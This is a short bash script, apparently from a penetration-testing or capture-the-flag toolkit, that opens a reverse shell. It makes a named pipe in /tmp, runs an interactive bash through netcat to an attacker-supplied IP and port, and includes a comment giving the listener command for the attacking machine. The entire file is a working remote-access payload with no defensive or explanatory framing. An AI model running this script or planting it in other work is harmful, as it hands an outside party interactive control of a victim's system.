#!/usr/bin/env bash

set -u

attackbox_ip=$1
attackbox_port=$2

# attackbox listens: nc –l -p [port]
mkfifo /tmp/f
/usr/bin/env bash -i </tmp/f 2>&1 | nc $attackbox_ip $attackbox_port >/tmp/f
rm /tmp/f
